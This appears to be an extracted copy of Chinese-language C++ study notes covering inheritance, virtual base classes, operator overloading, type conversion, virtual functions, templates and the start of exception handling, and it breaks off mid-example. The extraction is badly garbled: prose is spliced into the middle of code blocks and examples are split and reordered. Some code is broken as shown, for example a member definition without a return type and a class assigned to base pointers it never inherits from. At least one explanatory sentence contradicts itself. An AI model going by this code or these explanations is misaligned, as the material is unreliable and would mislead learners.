<p>using namespace std;</p>
<p>class person {</p>
<p>private:</p>
<p>string name;</p>
<p>int age;</p>
<p>protected:</p>
<p>void setinfo(string name1, int age1) {</p>
<p>name = name1;</p>
<p>age = age1;</p>
<p>}</p>
<p>void getinfo() {</p>
<p>cout &lt;&lt; &quot;name:&quot; &lt;&lt; name &lt;&lt; endl;</p>
<p>cout &lt;&lt; &quot;age:&quot; &lt;&lt; age &lt;&lt; endl;</p>
<p>}</p>
<p>};</p>
<p>class student :public person {</p>
<p>protected:</p>
<p>float sorces;</p>
<p>public:</p>
<p>void setinfo1(string n, int a, float s) {</p>
<p>setinfo(n, a);//调用基类的函数访问基类的私有成员<strong>派生类的构造函数和析构函数</strong></p>
<p>当基类的构造函数没有参数或者没有显式定义，派生类可以不向基类传递参数，也可以不定义构造函数</p>
<p>派生类的构造函数格式如下：</p>
<p><strong>与使用成员初始化列表初始化类非常相似</strong></p>
<p>当构造函数定义在外部时，类内声明不需要写初始化列表</p>
<p>构造函数与析构函数的执行顺序：</p>
<p>\1. 基类的构造函数</p>
<p>\2. 派生类的构造函数</p>
<p>\3. 派生类对象成员的构造函数</p>
<p>\4. 派生类对象成员的析构函数</p>
<p>\5. 派生类的析构函数</p>
<p>\6. 基类的析构函数</p>
<p>如果派生类的基类也是派生类，每个派生类只需负责其直接提供基类数据成员的初始化</p>
<p><strong>调整基类成员在派生类中访问属性的其他方法</strong></p>
<p><strong>同名成员</strong></p>
<p>在派生类中声明与基类同名的成员会覆盖基类的同名成员</p>
<p>可以通过作用域运算符来访问到基类的同名成员，例如：</p>
<p>sorces = s;</p>
<p>}</p>
<p>void disp() {</p>
<p>getinfo();//调用基类的函数访问基类的私有成员</p>
<p>cout &lt;&lt; &quot;sorces:&quot; &lt;&lt; sorces &lt;&lt; endl;</p>
<p>}</p>
<p>};</p>
<p>int main() {</p>
<p>student LiHua;</p>
<p>LiHua.setinfo1(&quot;LiHua&quot;, 66, 77);</p>
<p>LiHua.disp();</p>
<p>return 0;</p>
<p>}</p>
<p>name:LiHua</p>
<p>age:66</p>
<p>sorces:77</p>
<p>派生类名（参数总表）：基类名（参数表）{</p>
<p>派生类新增的成员的初始化语句</p>
<p>}</p>
<p>class A{</p>
<p>public:</p>
<p>void print();声明同名的数据成员会作为新的变量出现：</p>
<p><strong>访问声明</strong></p>
<p>访问声明用来个别调整基类成员在派生类中保持<strong>原来</strong>（原来的访问属性不可改变）的访问属性。</p>
<p>声明方法是：把基类成员写在派生类中，同时给成员名前加上 基类名：： ，访问声明中不带有类型和参</p>
<p>数</p>
<p>数据成员也可以访问声明。</p>
<p>对于重载函数名，访问声明将对所有同名函数生效。</p>
<p>};</p>
<p>class B: public A{</p>
<p>public:</p>
<p>void print(){</p>
<p>A::print();</p>
<p>cout &lt;&lt; endl;</p>
<p>}</p>
<p>};</p>
<p>int main(){</p>
<p>B tmp;</p>
<p>tmp.print();//访问派生类中的print函数</p>
<p>tmp.A::print();//访问基类中的print函数</p>
<p>return 0;</p>
<p>}</p>
<p>#include<iostream></p>
<p>using namespace std;</p>
<p>class base {</p>
<p>public:</p>
<p>int i;</p>
<p>base(int x):i(x){}</p>
<p>};</p>
<p>class derived :private base {</p>
<p>public:</p>
<p>derived(int a,int b) :base(a),i(b){}</p>
<p>int i;</p>
<p>};</p>
<p>int main() {</p>
<p>derived A(2,4);</p>
<p>cout &lt;&lt; A.i &lt;&lt; endl;</p>
<p>return 0;</p>
<p>}</p>
<p>4</p>
<p>class A{</p>
<p>public:</p>
<p>int a;</p>
<p>protected:<strong>多重继承</strong></p>
<p>从一个基类中派生叫做单继承</p>
<p>从多个基类中派生叫做多重继承</p>
<p><strong>多重继承派生类的声明</strong></p>
<p>与单继承派生类相似：</p>
<p>如果没写继承方式，默认是private</p>
<p>对于基类成员的访问与单继承相同</p>
<p>如果多个基类有相同的成员名，访问的时候需要使用成员限定名来消除二义性。</p>
<p><strong>多重继承派生类的构造函数与析构函数</strong></p>
<p>与单继承类似（有点像成员初始化列表）</p>
<p>对基类的初始化顺序取决于定义派生类时，基类声明的顺序</p>
<p>析构函数时不带参数的，所以派生类是否定义析构函数与基类无关</p>
<p><strong>虚基类</strong></p>
<p>使用场景：一个类多重继承的多个类拥有同一个父类，虚基类可以让这同一个父类成为这多重继承的类</p>
<p>的共同基类，而不是各自的基类。</p>
<p>一个类有多个直接基类，这些直接基类又有共同的基类，为了让这些直接基类对公共基类只存在一个复</p>
<p>制，则可以将这个公共基类说明为虚基类</p>
<p>void print();</p>
<p>};</p>
<p>class B: private A{</p>
<p>public:</p>
<p>A::a;</p>
<p>protected:</p>
<p>A::print;</p>
<p>};</p>
<p>A::print(){</p>
<p>cout &lt;&lt; a*a &lt;&lt; endl;</p>
<p>}</p>
<p>int main(){</p>
<p>B tmp;</p>
<p>cout &lt;&lt; tmp.a;</p>
<p>tmp.print();</p>
<p>return 0;</p>
<p>}</p>
<p>class 派生类名：继承方式1 基类1，继承方式2，基类2....{</p>
<p>新增部分</p>
<p>};</p>
<p>派生类名（参数总表）：基类名1（参数表1），基类名2（参数表2）...{</p>
<p>新增成员初始化语句</p>
<p>}声明继承关系时，使用关键字virtual说明即可（与继承方式关键字没有位置关系，在前在后都行）</p>
<p><strong>虚基类的初始化</strong></p>
<p>虚基类的初始化与一般多继承的初始化是一样的，但构造函数调用顺序不同：先调用虚基类的构造函</p>
<p>数，再调用非基类的构造函数，最后再调用派生类的构造函数。</p>
<p>如果虚基类中有带有形参的构造函数，则所有直接或间接派生类都必须再构造函数的成员初始化列表中</p>
<p>列出对虚基类构造函数的调用。</p>
<p>示例：初始化</p>
<p>class 派生类名:virtual 继承方式 基类名{</p>
<p>};</p>
<p>#include<iostream></p>
<p>#include<string></p>
<p>using namespace std;</p>
<p>class base {</p>
<p>private:</p>
<p>int a;</p>
<p>public:</p>
<p>base(int a):a(a){</p>
<p>cout &lt;&lt; &quot;base&quot; &lt;&lt; endl;</p>
<p>}</p>
<p>};</p>
<p>class base1 :virtual public base {</p>
<p>private:</p>
<p>int a1;</p>
<p>public:</p>
<p>base1(int a, int a1) :base(a), a1(a1) {</p>
<p>cout &lt;&lt; &quot;base1&quot; &lt;&lt; endl;</p>
<p>}</p>
<p>};</p>
<p>class base2 : virtual public base {</p>
<p>private:</p>
<p>int a2;</p>
<p>public:</p>
<p>base2(int a, int a2) :base(a), a2(a2) {</p>
<p>cout &lt;&lt; &quot;base2&quot; &lt;&lt; endl;</p>
<p>}</p>
<p>};</p>
<p>class base3 : public base1, public base2 {</p>
<p>private:</p>
<p>int a3;</p>
<p>public:</p>
<p>base3(int a, int a1, int a2, int a3) :base(a), base1(a, a1), base2(a, a2),</p>
<p>a3(a3) {</p>
<p>cout &lt;&lt; &quot;base3&quot; &lt;&lt; endl;</p>
<p>}</p>
<p>};</p>
<p>int main() {<strong>一个问题</strong></p>
<p>派生类从基类继承成员的时候，继承的成员是基类的成员还是基类成员的复制？虚基类呢？</p>
<p>base3 tmp(1,2,3,4);</p>
<p>return 0;</p>
<p>}</p>
<p>base</p>
<p>base1</p>
<p>base2</p>
<p>base3</p>
<p>#include<iostream></p>
<p>using namespace std;</p>
<p>class base {</p>
<p>protected:</p>
<p>int a;</p>
<p>public:</p>
<p>base(int a1) {</p>
<p>a = a1;</p>
<p>cout &lt;&lt; &quot;base:&quot; &lt;&lt; &amp;a &lt;&lt; endl;</p>
<p>}</p>
<p>};</p>
<p>class base0 :virtual public base {</p>
<p>public:</p>
<p>base0(int a1) :base(a1) {}</p>
<p>void geta() {</p>
<p>cout &lt;&lt; &quot;虚基类1：&quot; &lt;&lt; &amp;a &lt;&lt; endl;</p>
<p>}</p>
<p>};</p>
<p>class base1 :virtual public base {</p>
<p>public:</p>
<p>base1(int a1) :base(a1) {}</p>
<p>void geta() {</p>
<p>cout &lt;&lt; &quot;虚基类2：&quot; &lt;&lt; &amp;a &lt;&lt; endl;</p>
<p>}</p>
<p>};</p>
<p>class basev :public base0, public base1 {</p>
<p>public:</p>
<p>basev(int a1) :base(a1),base0(a1),base1(a1) {}</p>
<p>void geta() {</p>
<p>base0::geta();</p>
<p>base1::geta();</p>
<p>cout &lt;&lt;&quot;虚基类派生：&quot;&lt;&lt; &amp;a &lt;&lt; endl;</p>
<p>cout &lt;&lt; &quot;------------------&quot; &lt;&lt; endl;</p>
<p>}</p>
<p>};</p>
<p>/*</p>
<p>base0和base1是base虚基类的派生类，basev是base0和base1的派生类</p>
<p>执行过程中会调用一次基类的构造函数base0和base1和basev从base继承的成员访问地址是一样的，访问时可以直接访问</p>
<p>也就是说，虚基类可以让不同类继承的同一个基类的元素，而不是不同类分别复制继承同一个基类</p>
<p>*/</p>
<p>class base2 :public base {</p>
<p>public:</p>
<p>base2(int a1) :base(a1) {}</p>
<p>void geta() {</p>
<p>cout &lt;&lt; &quot;一般基类1：&quot; &lt;&lt; &amp;a &lt;&lt; endl;</p>
<p>}</p>
<p>};</p>
<p>class base3 :public base {</p>
<p>public:</p>
<p>base3(int a1) :base(a1) {}</p>
<p>void geta() {</p>
<p>cout &lt;&lt; &quot;一般基类2：&quot; &lt;&lt; &amp;a &lt;&lt; endl;</p>
<p>}</p>
<p>};</p>
<p>class basea :public base2, public base3 {</p>
<p>public:</p>
<p>basea(int a1):base2(a1),base3(a1){}</p>
<p>void geta() {</p>
<p>base2::geta();</p>
<p>base3::geta();</p>
<p>cout &lt;&lt; &quot;------------------&quot; &lt;&lt; endl;</p>
<p>}</p>
<p>};</p>
<p>/*</p>
<p>base2和base3是base基类的派生类，这里没有声明虚基类，basea是base2和base3的派生类</p>
<p>basea中继承的base2和base3分别各自从base类中继承了成员，所以base2和base3中继承的成员是不同</p>
<p>的（地址），访问时需要成员限定符来单独指定</p>
<p>base的构造函数调用了两次</p>
<p>*/</p>
<p>int main() {</p>
<p>basev tmp1(1);</p>
<p>tmp1.geta();</p>
<p>basea tmp2(2);</p>
<p>tmp2.geta();</p>
<p>return 0;</p>
<p>}</p>
<p>base:009BF71C</p>
<p>虚基类1：009BF71C</p>
<p>虚基类2：009BF71C</p>
<p>虚基类派生：009BF71C</p>
<p>------------------</p>
<p>base:009BF704</p>
<p>base:009BF708</p>
<p>一般基类1：009BF704</p>
<p>一般基类2：009BF708</p>
<p>------------------<strong>基类与派生类对象之间的赋值兼容关系</strong></p>
<p>简单来说就是：派生类可以当基类来用，反之不行：</p>
<p>\1. 派生类对象可以给基类对象赋值</p>
<p>\2. 派生类对象可以初始化基类对象引用</p>
<p>\3. 派生类对象（公有派生对象可以，私有则不行）地址可以赋值给基类对象的指针</p>
<p>\4. 函数形参是基类对象（或基类引用）时，可以用派生类对象来代替</p>
<p>示例：</p>
<p><strong>第五章：多态性</strong></p>
<p>#include<iostream></p>
<p>using namespace std;</p>
<p>class base {</p>
<p>public:</p>
<p>int i;</p>
<p>base(int x) {</p>
<p>i = x;</p>
<p>}</p>
<p>void show() {</p>
<p>cout &lt;&lt; &quot;base:&quot; &lt;&lt; i &lt;&lt; endl;</p>
<p>}</p>
<p>};</p>
<p>class derived:public base {</p>
<p>public:</p>
<p>derived(int x) :base(x){}</p>
<p>};</p>
<p>void fun(base&amp; bb) {</p>
<p>cout &lt;&lt; bb.i &lt;&lt; endl;</p>
<p>}</p>
<p>int main() {</p>
<p>base op1(12);</p>
<p>derived op2(23),*ptr;</p>
<p>base op3 = op2;//派生类对象给基类对象赋值</p>
<p>op3.show();</p>
<p>base&amp; op4 = op2;//派生类对象可以初始化基类引用</p>
<p>op4.show();</p>
<p>ptr = &amp;op2;//派生类对象地址可以复制给基类对象指针</p>
<p>ptr-&gt;show();</p>
<p>fun(op2);//派生类对象可以代替基类对象作为函数参数</p>
<p>return 0;</p>
<p>}</p>
<p>base:23</p>
<p>base:23</p>
<p>base:23</p>
<p>23多态性是指不同对象接收到相同消息执行不同的操作</p>
<p>程序编译过程分为静态联编和动态联编</p>
<p>静态联编支持多态性通过<strong>重载</strong>（函数重载[第二章]，运算符重载）实现</p>
<p>动态联编支持多态性通过<strong>虚函数</strong>实现</p>
<p><strong>运算符重载</strong></p>
<p>运算符的重载通过创建运算符重载函数来实现。可以是如下几种：</p>
<p>在类外定义的运算符重载函数</p>
<p>类的成员函数</p>
<p>类的友元函数</p>
<p>运算符重载用于简化类的对象与其他数据进行运算的操作</p>
<p><strong>在类外定义的运算符重载函数</strong></p>
<p>这种运算符重载函数仅能用于操作类的公有成员，私有成员和保护成员需要用到类的成员重载函数和友</p>
<p>元函数。</p>
<p>定义方法：定义函数名为operator@(@表示运算符，可以是+-*/...等)的函数</p>
<p>说明：</p>
<p>\1. 只有以下运算符不允许重载：2. 只能对C++已有的运算符进行重载，不能新定义运算符</p>
<p>\3. 重载不能改变运算符的</p>
<p>\1. 操作对象</p>
<p>\2. 优先级</p>
<p>\3. 结合特性</p>
<p>\4. 运算符重载函数的参数需要至少有一个是类对象</p>
<p>\5. 运算符重载函数可以是普通函数，类的成员函数，类的友元函数</p>
<p>\6. 一般用作类的运算符必须重载</p>
<p>\7. 赋值运算符 = ，默认有重载，功能是赋值</p>
<p>示例：</p>
<p><strong>友元运算符重载</strong></p>
<p>定义形式有两种：</p>
<p>\1. 在类内定义</p>
<p>\2. 在类外定义，在类内声明友元函数原型（类外的重载函数不属于成员）</p>
<p>定义方式同普通友元函数一样，详见第二章</p>
<p>对双目运算符重载需要两个参数</p>
<p>. 成员访问运算符</p>
<p>.* 成员访问指针运算符</p>
<p>:: 作用域运算符</p>
<p>sizeof 长度运算符</p>
<p>?: 条件运算符</p>
<p>#include<iostream></p>
<p>using namespace std;</p>
<p>class complex {</p>
<p>public:</p>
<p>double r;</p>
<p>double i;</p>
<p>complex(double a=0, double b=0) :r(a), i(b) {}</p>
<p>};</p>
<p>complex operator+(complex op1, complex op2) {</p>
<p>complex tmp;</p>
<p>tmp.r = op1.r + op2.r;</p>
<p>tmp.i = op1.i + op2.i;</p>
<p>return tmp;</p>
<p>}</p>
<p>int main() {</p>
<p>complex A(1, 2), B(3, 3),sum;</p>
<p>sum = A + B;</p>
<p>cout &lt;&lt; sum.r &lt;&lt; endl &lt;&lt; sum.i &lt;&lt; endl;</p>
<p>}</p>
<p>4</p>
<p>5对单目运算符重载需要一个参数</p>
<p>说明：</p>
<p>\1. 在函数返回的时候，可以直接用类的构造函数生成一个临时对象</p>
<p>\2. 重载函数的参数不能使用对象作为形参然后返回这个对象，因为对象返回前会先被析构，形参的修</p>
<p>改无法传递到函数外，需要用引用或者指针</p>
<p>\3. 运算符重载函数可以返回任意类型</p>
<p>\4. 有的运算符不能定义为友元运算符重载函数：</p>
<p>\1. 赋值运算符=</p>
<p>\2. 下标运算符[]</p>
<p>\3. 函数调用运算符()</p>
<p><strong>成员运算符重载函数</strong></p>
<p>定义形式有两种：</p>
<p>\1. 在类内定义</p>
<p>\2. 在类外定义，在类内声明函数原型</p>
<p>对于双目运算符，需要一个参数（右参数），左参数由this指针隐含传递</p>
<p>对于单目运算符，不需要参数，由当前对象作为操作数传递参数</p>
<p><strong>成员运算符重载函数与友元运算符重载函数的区别</strong></p>
<p>\1. 运算符参数数量不同</p>
<p>\2. 有一种情况必须用友元运算符重载函数：一个对象与一个普通类型数据进行计算的时候</p>
<p>书上215页给出的声明运算符重载函数的经验参考：</p>
<p>\1. 对于单目运算符，建议选择成员函数</p>
<p>\2. 对于运算符=,(),[],-&gt;，只能作为成员函数</p>
<p>\3. 对于运算符+=,-=,*=,/=,&amp;=,!=,~=,%=,&lt;&lt;=,&gt;&gt;=，建议重载为成员函数</p>
<p>\4. 其他运算符，建议重载为友元函数</p>
<p>**++<strong><strong>和</strong></strong>--**<strong>的重载</strong></p>
<p>++和--这两个运算符可前缀也可后缀，默认情况下，前缀是先运算再返回，后缀是先返回再运算。</p>
<p>重载运算符的时候，可以通过关键词int作为参数来选择是前缀还是后缀使用：</p>
<p>前缀：</p>
<p>后缀：</p>
<p>友元运算符重载函数没有this指针，所以采用对象引用参数传递数据</p>
<p>return complex(op1.r+op2.r,op1.i+op2.i);</p>
<p>op.operator++();</p>
<p>operator++(X&amp; a);</p>
<p>op.operator++(int);</p>
<p>operator++(X&amp; a,int);前缀后缀方式的函数内部语句取决与编程需要</p>
<p>**示例：****++,--**<strong>运算符前缀和后缀的运算顺序分析</strong></p>
<p>一般情况下前缀和后缀的区别</p>
<p>反汇编分析：</p>
<p>#include<iostream></p>
<p>using namespace std;</p>
<p>int main() {</p>
<p>int a = 10;</p>
<p>int b = 10;</p>
<p>cout &lt;&lt; ++a;</p>
<p>//cout &lt;&lt; endl;</p>
<p>cout &lt;&lt; b++;</p>
<p>return 0;</p>
<p>}</p>
<p>int a = 10;</p>
<p>00322798 mov dword ptr [a],0Ah</p>
<p>int b = 10;</p>
<p>0032279F mov dword ptr [b],0Ah</p>
<p>;变量赋值</p>
<p>cout &lt;&lt; ++a;</p>
<p>003227A6 mov eax,dword ptr [a]</p>
<p>003227A9 add eax,1</p>
<p>003227AC mov dword ptr [a],eax</p>
<p>003227AF mov esi,esp</p>
<p>003227B1 mov ecx,dword ptr [a]</p>
<p>003227B4 push ecx</p>
<p>;把a的值加1然后入栈进入调用</p>
<p>003227B5 mov ecx,dword ptr [<em>imp</em>?cout@std@@3V?$basic_ostream@DU?</p>
<p>$char_traits@D@std@@@1@A (032D0D8h)]</p>
<p>003227BB call dword ptr</p>
<p>[__imp_std::basic_ostream&lt;char,std::char_traits<char> &gt;::operator&lt;&lt; (032D0E0h)]</p>
<p>003227C1 cmp esi,esp</p>
<p>003227C3 call __RTC_CheckEsp (0321285h)</p>
<p>//cout &lt;&lt; endl;</p>
<p>;打印</p>
<p>cout &lt;&lt; b++;</p>
<p>003227C8 mov eax,dword ptr [b]</p>
<p>003227CB mov dword ptr [ebp-0DCh],eax</p>
<p>;把b的值额外存起来</p>
<p>003227D1 mov ecx,dword ptr [b]</p>
<p>003227D4 add ecx,1</p>
<p>003227D7 mov dword ptr [b],ecx</p>
<p>;b的值加一</p>
<p>003227DA mov esi,esp</p>
<p>003227DC mov edx,dword ptr [ebp-0DCh]</p>
<p>003227E2 push edx</p>
<p>;把刚才额外存起来的值入栈调用</p>
<p>003227E3 mov ecx,dword ptr [<em>imp</em>?cout@std@@3V?$basic_ostream@DU?</p>
<p>$char_traits@D@std@@@1@A (032D0D8h)]<strong>赋值运算符</strong> = <strong>的重载</strong></p>
<p>一般情况下，用默认的重载赋值运算符就够用了，默认的功能就是将一个对象的值逐域赋值给另一个对</p>
<p>象，这是一种浅层复制的方法。</p>
<p>类的赋值运算符只能重载为成员函数</p>
<p>当类中由指针成员时，使用默认的赋值运算符会产生错误：指针悬挂问题</p>
<p><strong>指针悬挂问题</strong></p>
<p>用别人一张图来简单说明，两个对象p1和p2，都有一个指针类型的数据成员，当使用了默认的赋值运</p>
<p>算符进行赋值之后（p2=p1），p2的指针会指向p2指向的那个空间，当对象p2被撤销后，p1的指针指</p>
<p>向了一个错误的地方，这就是指针悬挂问题</p>
<p><strong>深层赋值</strong></p>
<p>通过深层赋值可以解决指针悬挂问题，通过重载赋值运算符=实现：</p>
<p>还以上图为例，内容大致为先将P2原来指向的空间给释放掉，然后重新申请一片空间，将p1指向的空</p>
<p>间的值复制到p2新的空间</p>
<p><strong>下标运算符</strong>**&quot;[]&quot;**<strong>的重载</strong></p>
<p>[]是一个双目运算符</p>
<p>重载函数只能定义为成员函数，形参表示下标</p>
<p>重载时，返回一个int型的引用，可使重载的[]用在赋值语句的左边</p>
<p>示例：</p>
<p>003227E9 call dword ptr</p>
<p>[__imp_std::basic_ostream&lt;char,std::char_traits<char> &gt;::operator&lt;&lt; (032D0E0h)]</p>
<p>003227EF cmp esi,esp</p>
<p>003227F1 call __RTC_CheckEsp (0321285h)</p>
<p>;打印</p>
<p>return 0;</p>
<p>003227F6 xor eax,eax</p>
<p>}<strong>类型转换</strong></p>
<p><strong>系统预设的类型转换</strong></p>
<p>分为隐式转换和显示转换：</p>
<p>隐式转换</p>
<p>在赋值表达式A=B时，赋值运算都右边的B会先转换成A的类型</p>
<p>当char或short类型变量与int类型变量进行运算时，将char和short类型转换成int类型</p>
<p>当两个操作对象不一样的时候，算数运算前，低级别 的类型自动转换成高级别的类型</p>
<p>显式转换</p>
<p>类型名(表达式)</p>
<p>通过转换构造函数可以将 预定义类型数据 转换成 类类型数据</p>
<p>通过类型转换函数可以将 类类型数据 转换成 预定义类型数据</p>
<p><strong>转换构造函数</strong></p>
<p>一个特殊的构造函数，只有一个参数，用这个参数初始化一个临时对象用来运算</p>
<p><strong>类型转换函数</strong></p>
<p>#include<iostream></p>
<p>using namespace std;</p>
<p>class arr {</p>
<p>public:</p>
<p>arr(int a1,int b1,int c1,int d1){</p>
<p>a[0] = a1;</p>
<p>a[1] = b1;</p>
<p>a[2] = c1;</p>
<p>a[3] = d1;</p>
<p>}</p>
<p>int&amp; operator[](int aa);</p>
<p>private:</p>
<p>int a[4];</p>
<p>};</p>
<p>int&amp; arr::operator[](int aa) {</p>
<p>if (aa &lt; 0 || aa &gt;= 4)exit(1);</p>
<p>return a[aa];</p>
<p>}</p>
<p>int main() {</p>
<p>arr op1(1, 2, 3, 4);</p>
<p>int t = 0;</p>
<p>t = op1[2];</p>
<p>cout &lt;&lt; t &lt;&lt; endl;</p>
<p>op1[1] = 10;</p>
<p>cout &lt;&lt; op1[1] &lt;&lt; endl;</p>
<p>return 0;</p>
<p>}</p>
<p>3</p>
<p>10格式：</p>
<p>目标类型为要转换的类型，就像是重载预设的显式转换函数</p>
<p>说明：</p>
<p>\1. 类型转换只能是类的成员函数</p>
<p>\2. 类型转换函数没有参数，也没函数类型</p>
<p>\3. 必须由return语句</p>
<p>\4. 一个类可以有多个类型转换函数</p>
<p><strong>示例</strong></p>
<p>\1. 程序先从类中寻找有没有重载类的加法运算符</p>
<p>\2. 然后寻找类中重载的类型转换函数，找到了是int</p>
<p>\3. 然后找找有没有转换构造函数</p>
<p>\4. 然后类型转换成int，然后通过转换构造函数生成临时对象用于赋值</p>
<p>operator 目标类型(){</p>
<p>函数体</p>
<p>}</p>
<p>#include<iostream></p>
<p>using namespace std;</p>
<p>class complex {</p>
<p>public:</p>
<p>complex() {}</p>
<p>complex(int a, int b) {</p>
<p>r = a;</p>
<p>i = b;</p>
<p>}</p>
<p>complex(int x) {</p>
<p>r = i = x;</p>
<p>}</p>
<p>operator int() {</p>
<p>return r + i;</p>
<p>}</p>
<p>void print() {</p>
<p>cout &lt;&lt; r &lt;&lt; &quot;,&quot; &lt;&lt; i &lt;&lt; endl;</p>
<p>}</p>
<p>private:</p>
<p>int r;</p>
<p>int i;</p>
<p>};</p>
<p>int main() {</p>
<p>complex A(5, 4),B(2,2),C;</p>
<p>C = A + B;</p>
<p>C.print();</p>
<p>return 0;</p>
<p>}<strong>虚函数</strong></p>
<p>当基类指针指向公有派生类对象的时候，基类指针只能访问派生类中从基类继承的成员，不能访问派生</p>
<p>类中定义的成员。</p>
<p>也就是基类指针只能指向派生类的基类部分</p>
<p>为了解决这个问题，引入虚函数，虚函数在程序运行过程中进行决定执行哪个内容</p>
<p>虚函数用于处理基类指针指向派生类所带来的问题。</p>
<p><strong>定义虚函数</strong></p>
<p>在普通的声明函数前加上关键字“virtual”即可声明为虚函数，虚函数只能声明为成员函数，不能声明为</p>
<p>友元函数和静态成员函数</p>
<p>也可以在类外定义，在类内声明，仅在声明的时候写出虚函数关键字即可</p>
<p>在派生类中，对虚函数重新定义需要函数原型与基类完全相同，当一个成员函数被定义为虚函数的时</p>
<p>候，其派生类中复合重新定义虚函数要求的同名函数都会自动成为虚函数</p>
<p>在派生类中，如果没有重新定义虚函数，则公有派生类直接继承基类的虚函数</p>
<p>只有通过基类指针访问虚函数时才能获得运行时的多态性</p>
<p><strong>虚析构函数</strong></p>
<p>C++中不能声明虚析构函数，但可以声明虚析构函数</p>
<p>基类指针指向派生类之后，如果没有虚析构函数，则删除对象时会调用基类的析构函数，而不是</p>
<p>派生类的</p>
<p><strong>虚函数与重载函数的关系</strong></p>
<p>基类的虚函数重新定义是一种特殊的重载函数，在派生类中重新定义的时候，要求函数类型，函数名，</p>
<p>参数数量，参数类型顺序都必须与基类虚函数原型完全相同</p>
<p><strong>多重继承与虚函数</strong></p>
<p>多重继承时，例如：</p>
<p>class A{</p>
<p>virtual void print(){</p>
<p>cout &lt;&lt; &quot;111&quot;&lt;&lt; endl;</p>
<p>}</p>
<p>};</p>
<p>class B{</p>
<p>virtual ~B(){</p>
<p>cout &lt;&lt; &quot;T&quot;&lt;&lt;endl;</p>
<p>}</p>
<p>};</p>
<p>#include<iostream></p>
<p>using namespace std;</p>
<p>class B1{</p>
<p>virtual void fun(){</p>
<p>cout &lt;&lt; &quot;B1&quot; &lt;&lt; endl;<strong>纯虚函数</strong></p>
<p>纯虚函数是一个在基类中声明的函数，在基类中没有定义，在派生类中需要进行定义，所以在基类中声</p>
<p>明为纯虚函数</p>
<p>在基类中为派生类保留一个虚函数的名字，功能由派生类来定义</p>
<p><strong>抽象类</strong></p>
<p>一个类中至少存在一个纯虚函数，则称之为抽象类</p>
<p>抽象类不能建立对象，只能用作基类</p>
<p>抽象类不能作为参数类型，返回值类型，转换类型，但可以声明指针，用来实现多态性</p>
<p>如果抽象类的派生类没有重新说明纯虚函数，则派生类也是抽象类</p>
<p><strong>第六章：模板与异常处理</strong></p>
<p>}</p>
<p>};</p>
<p>class B2{</p>
<p>void fun(){</p>
<p>cout &lt;&lt; &quot;B2&quot; &lt;&lt; endl;</p>
<p>}</p>
<p>};</p>
<p>class D{</p>
<p>void fun(){</p>
<p>cout &lt;&lt; &quot;D&quot; &lt;&lt; endl;</p>
<p>}</p>
<p>};</p>
<p>int main(){</p>
<p>B1 *ptr1;</p>
<p>B2 *ptr2;</p>
<p>D obj;</p>
<p>ptr1 = &amp;obj;</p>
<p>ptr1 -&gt; fun();//对于ptr1的继承路线，fun函数是虚函数，此时fun函数指向派生类的fun函数</p>
<p>ptr2 = &amp;obj;</p>
<p>ptr2 -&gt; fun();//对于ptr2的继承路线，fun函数是普通函数，此时fun函数指向B2类中的fun函数</p>
<p>return 0;</p>
<p>}</p>
<p>virtual 函数类型 函数名称(参数表)=0;模板是实现代码重用机制的一种工具，可以实现类型参数化</p>
<p>模板分为：</p>
<p>函数模板</p>
<p>类模板</p>
<p><strong>函数模板和模板函数</strong></p>
<p>函数模板是建立一个通用函数，函数返回类型和形参类型不指定，用虚拟类型来代表，在调用的时候用</p>
<p>实参类型来取代虚拟类型</p>
<p>函数模板声明如下：</p>
<p>其中typename和class都可以用，功能是一样的</p>
<p>函数模板经过实例化生成的具体函数是模板函数</p>
<p>使用示例：</p>
<p>模板中的虚拟类型会在模板函数调用的时候，变成实参的类型</p>
<p>说明：</p>
<p>函数模板中可以用多个类型参数，每个类型参数都要用关键字typename</p>
<p>template关键字和函数模板之间不能有其他的内容</p>
<p>模板函数类似于重载函数，但同一函数模板实例化后执行相同的操作</p>
<p>函数模板也可以重载</p>
<p>函数模板与同名非模板函数可以重载，调用顺序是：</p>
<p>先找参数完全匹配的非重载函数，找到就调用</p>
<p>如果没找到，就找函数模板，将其实例化</p>
<p>如果实例化后产生一个相匹配的函数，就调用它</p>
<p>template &lt;typename 参数类型&gt;</p>
<p>返回类型 函数名(模板参数表){</p>
<p>函数体</p>
<p>}</p>
<p>#include<iostream></p>
<p>using namespace std;</p>
<p>template <typename AT></p>
<p>AT max(AT a, AT b) {</p>
<p>return a &gt; b ? a : b;</p>
<p>}</p>
<p>int main() {</p>
<p>cout &lt;&lt; max(5, 6) &lt;&lt; endl;</p>
<p>cout &lt;&lt; max('a', 'b') &lt;&lt; endl;</p>
<p>return 0;</p>
<p>}</p>
<p>6</p>
<p>b<strong>类模板与模板类</strong></p>
<p>类模板是建立一个通用类，其数据成员，成员函数的返回值和形参类型不指定，用一个虚拟类型代表</p>
<p>声明：</p>
<p>类成员声明中，如果需要用通用类型，直接用类型参数即可</p>
<p>定义对象：</p>
<p>使用举例：</p>
<p>成员函数如果声明在类外：</p>
<p>使用举例：</p>
<p>template &lt;typename 类型参数&gt;</p>
<p>class 类名{</p>
<p>类成员声明</p>
<p>};</p>
<p>类模板名&lt;实际类型名&gt;对象名(实参列表)</p>
<p>#include<iostream></p>
<p>using namespace std;</p>
<p>template <typename AT></p>
<p>class compare {</p>
<p>private:</p>
<p>AT a;</p>
<p>AT b;</p>
<p>public:</p>
<p>compare(AT a1, AT b1) {</p>
<p>a = a1;</p>
<p>b = b1;</p>
<p>}</p>
<p>AT max() {</p>
<p>return a &gt; b ? a : b;</p>
<p>}</p>
<p>};</p>
<p>int main() {</p>
<p>compare<int>op1(4, 5);</p>
<p>cout &lt;&lt; op1.max() &lt;&lt; endl;</p>
<p>return 0;</p>
<p>}</p>
<p>5</p>
<p>template &lt;typename 类型参数&gt;</p>
<p>函数类型 类名&lt;类型参数&gt;::成员函数名(形参表){</p>
<p>}说明：</p>
<p>类模板使用前，需要在模板名字后面加上&lt;参数类型&gt;</p>
<p>模板类可以有多个类型参数</p>
<p><strong>异常处理</strong></p>
<p>程序中常见的错误分为：编译时的错误，运行时的错误，后者难以发现，称之为异常</p>
<p>传统的处理异常的方式是通过条件分支语句来实现</p>
<p>C++处理异常是：执行一个函数过程中出现异常，发出一个消息，传给上一级来解决，依次逐级上传，</p>
<p>如果到最高一级还不能解决就中断程序</p>
<p>异常处理机制分为三部分：检查try，抛出throw，捕获catch</p>
<p>用法举例：</p>
<p>#include<iostream></p>
<p>using namespace std;</p>
<p>template <typename AT></p>
<p>class compare {</p>
<p>private:</p>
<p>AT a;</p>
<p>AT b;</p>
<p>public:</p>
<p>compare(AT a1, AT b1) {</p>
